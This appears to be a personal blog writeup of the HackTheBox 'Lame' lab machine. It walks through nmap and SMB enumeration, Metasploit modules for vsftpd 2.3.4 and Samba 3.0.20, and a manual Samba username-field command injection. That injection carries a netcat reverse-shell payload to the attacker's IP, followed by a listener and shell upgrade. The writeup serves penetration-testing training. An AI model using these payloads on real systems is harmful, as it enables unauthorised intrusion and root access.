---
title: HackTheBox Lame Writeup
authors: Samarth
date: 2022-12-01 09:00:00 +0530
categories: [HackTheBox Machines]
tags: [Command Injection, Linux, SMB]
math: true
mermaid: true
---

![Lame - HTB](/assets/images/writeups/Lame-HTB/banner.png)

## TL:DR

This writeup is based on [__Lame__](https://app.hackthebox.com/machines/Lame){:target="_blank"} on Hack the box. It was a Linux box. It starts with two
major services, vsftpd, and Samba. We tried FTP logon but didn’t get anything interesting.
Then try to exploit Samba service via command injection in the username field. Using samba
service exploitation, we got a shell, then later using directory listing, we got the user
flag and the root flag.

## Scanning Network

I started with a Nmap scan, I found ports 21, 22, 139, and 445 as FTP, SSH, NetBIOS-ssn,
and Microsoft-ds respectively. I got FTP login allowed via anonymous user and Samba service. 
By Nmap’s banner grabbing, we got the Samba version that is 3.0.20. Let’s see the Nmap result.

```bash
 Command - nmap -sV -A <ip address>

 Nmap scan report for 10.129.127.33
 Host is up (0.57s latency).
 Not shown: 996 filtered ports
 PORT    STATE SERVICE     VERSION
 21/tcp  open  ftp         vsftpd 2.3.4
 |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
 |      Connected to 10.10.14.23
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
 |      Session timeout in seconds is 300
 |      Control connection is plain text
 |      Data connections will be plain text
 |      vsFTPd 2.3.4 - secure, fast, stable
 |_End of status
 22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
 | ssh-hostkey: 
 |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
 |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
 139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 Host script results:
 |_clock-skew: mean: 2h00m26s, deviation: 2h49m43s, median: 25s
 | smb-os-discovery: 
 |   OS: Unix (Samba 3.0.20-Debian)
 |   Computer name: lame
 |   NetBIOS computer name: 
 |   Domain name: hackthebox.gr
 |   FQDN: lame.hackthebox.gr
 |_  System time: 2021-04-01T06:39:27-04:00
 | smb-security-mode: 
 |   account_used: 
 |   authentication_level: user
 |   challenge_response: supported
 |_  message_signing: disabled (dangerous, but default)
 |_smb2-time: Protocol negotiation failed (SMB2)
 ```
In Nmap scan, we get the versions of both services, vsftpd 2.3.4 and Samba 3.0.20 and also we
get the login information of the FTP. As per the version of both services, it looks like we 
have exploits available for both. With this information of both services now moves towards to
next phase.

## Enumeration

In the enumeration phase, we will first enumerate the FTP via anonymous user.

```bash 
 Command - ftp 10.129.127.33

 Connected to 10.129.127.33.
 220 (vsFTPd 2.3.4)
 Name (<ip address>:root): anonymous
 331 Please specify the password.
 Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
 ftp> ls
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
 226 Directory send OK.
 ftp> ls -al
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
 drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
 drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
 226 Directory send OK.
 ftp> pwd 
 257 "/"
 ftp>
```
As we enumerated FTP, we didn’t anything interesting, but we know that FTP is vulnerable so
we can try to exploit it in the exploitation phase. Now, let’s move to Samba service.

Here, we can enumerate Samba using [__smbmap__](https://www.kali.org/tools/smbmap/){:target="_blank"} to get more information about the machine.

```bash
 Command - smbmap -H 10.129.127.33

 [+] IP: 10.129.127.33:445       Name: 10.129.127.33 
 Disk                                                    Permissions     Comment
 ----                                                    -----------     -------
 print$                                                  NO ACCESS       Printer Drivers
 tmp                                                     READ, WRITE     oh noes!
 opt                                                     NO ACCESS
 IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
 ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```
We get to know that the samba service provides read and write access to tmp directory. 
Now, we can do a recursive scan to identify more information about it.

```bash
 Command - smbmap -H 10.129.127.33 -R

 [+] IP: 10.129.127.33:445       Name: 10.129.127.33 
 Disk                                                    Permissions     Comment
 ----                                                    -----------     -------
 print$                                                  NO ACCESS       Printer Drivers
 tmp                                                     READ, WRITE     oh noes!
 .\tmp*
 dr--r--r--                0 Thu Apr  1 07:09:11 2021    .
 dw--w--w--                0 Sat Oct 31 02:33:57 2020    ..
 dr--r--r--                0 Thu Apr  1 06:33:10 2021    .ICE-unix
 dw--w--w--                0 Thu Apr  1 06:33:33 2021    vmware-root
 dr--r--r--                0 Thu Apr  1 06:33:35 2021    .X11-unix
 fw--w--w--               11 Thu Apr  1 06:33:35 2021    .X0-lock
 fw--w--w--                0 Thu Apr  1 06:34:22 2021    5581.jsvc_up
 fw--w--w--             1600 Thu Apr  1 06:33:08 2021    vgauthsvclog.txt.0
 .\tmp.X11-unix*
 dr--r--r--                0 Thu Apr  1 06:33:35 2021    .
 dr--r--r--                0 Thu Apr  1 07:09:11 2021    ..
 fr--r--r--                0 Thu Apr  1 06:33:35 2021    X0
 opt                                                     NO ACCESS
 IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
 ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```
By doing a recursive scan, we get to know what content is stored in the tmp directory. Now,
we will first move toward the FTP exploitation and try to exploit it.
 
## Exploitation

### FTP Exploitation

Here, we can use [__searchsploit__](https://www.exploit-db.com/searchsploit){:target="_blank"} to find the exploit.

```bash
 msf6 > search vsftpd 2.3.4
 Matching Modules
 #  Name                                  Disclosure Date  Rank       Check  Description
    ----                                  ---------------  ----       -----  -----------
 0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution 
```
As we get vsftpd 2.3.4 – Backdoor Command Execution (Metasploit). Let’s exploit it using 
[__Metasploit__](https://www.metasploit.com/){:target="_blank"}.

```bash
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.129.127.33
 RHOSTS => <ip address>
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST tun0
 LHOST => tun0
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 [*] 10.129.127.200:21 - Banner: 220 (vsFTPd 2.3.4) 
 [*] 10.129.127.200:21 - USER: 331 Please specify the password.
 [*] Exploit completed, but no session was created.
```
As you are able to see above, we provided the machine IP address as an RHOSTS(Remote Host Computer)
and our local IP address(tun0) as an LHOST(Local Host Computer or tun0). So, we can exploit the FTP
using a backdoor but we didn’t get a shell. So, now let’s move to smb exploitation manually as well
as using the [__Metasploit__](https://www.metasploit.com/){:target="_blank"}.

### Samba Exploitation (Using Metasploit)

We can search samba with version on metasploit and find a suitable exploit for it.

```bash
 msf6 > searchsploit Samba 3.0
 Matching Modules
 ================
 
    #  Name                                       Disclosure Date  Rank       Check  Description
    -  ----                                       ---------------  ----       -----  -----------
    0  exploit/linux/samba/chain_reply            2010-06-16       good       No     Samba chain_reply Memory Corruption (Linux x86)
    1  exploit/linux/samba/lsa_transnames_heap    2007-05-14       good       Yes    Samba lsa_io_trans_names Heap Overflow
    2  exploit/multi/samba/usermap_script         2007-05-14       excellent  No     Samba "username map script" Command Execution
    3  exploit/osx/samba/lsa_transnames_heap      2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
    4  exploit/solaris/samba/lsa_transnames_heap  2007-05-14       average    No     Samba lsa_io_trans_names Heap Overflow
 ```
I will use exploit/multi/samba/usermap_script to exploit the service (use 2).

```bash
 msf6 exploit(multi/samba/usermap_script) > set RHOSTS <machine ip address>
 RHOSTS => 10.129.84.98
 msf6 exploit(multi/samba/usermap_script) > set LHOST tun0
 LHOST => tun0
 msf6 exploit(multi/samba/usermap_script) > exploit

 whoami
 root
 python -c 'import pty;pty.spawn("/bin/bash")'                      
 root@lame:/#
```
### Samba Exploiation (Manual)

### Command Injection

We can try to login into tmp folder in the samba service using [__smbclient__](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html){:target="_blank"}. We got an error in
connection because this machine is of the older version, so we can provide that same version
using options.

```bash
 Command - smbclient -N //<ip address>/tmp
 protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
 Command - smbclient -N //<ip address>/tmp --option='client min protocol=NT1'
```
After providing same version of Samba, we get the write access in tmp directory. Now we can try to
do command injection in the username field by using payload and on another terminal, we have to
open the Netcat to listen on a port.

We know that vulnerability has been exploited using command injection in the username. The payload
includes nohup(which is used to end the shell after a long time) and we put the listener command
(nc) along with our local IP address and port, and then /bin/sh, which provides a shell on the
system. we can also use /bin/bash as its another common shell present on linux.

```bash
 Payload for username - logon "/=nohup nc -nv 10.10.14.3 4444 -e /bin/sh"
```

```bash
 smbclient -N //<ip address>/tmp --option='client min protocol=NT1'  
 Anonymous login successful
 Try "help" to get a list of possible commands.
 smb: > logon "/=nohup nc -nv <receiver IP address> 4444 -e /bin/sh"
 Password: 
 session setup failed: NT_STATUS_IO_TIMEOUT
 smb: >
```
Now, we have to open listener using Netcat on another terminal to get back the system shell of
the machine.

```bash
 Command - nc -lvnp 4444 
```

```bash
 listening on [any] 4444 …
 connect to [<receiver ip address] from (UNKNOWN) [<machine ip address>] 35739
 whoami
 root
 python -c 'import pty; pty.spawn("/bin/bash")'
 root@lame:/#
```
As mentioned above, I used python -c ‘import pty; pty.spawn(“/bin/bash”)’, to get a
interactive shell.

[![Pwned](/assets/images/writeups/Lame-HTB/pwned.png)](https://www.hackthebox.com/achievement/machine/337503/1)

Thanks for reading this far. If you enjoyed the writeup, do support me [__here__](https://www.buymeacoffee.com/h4xplo1t){:target="_blank"}.
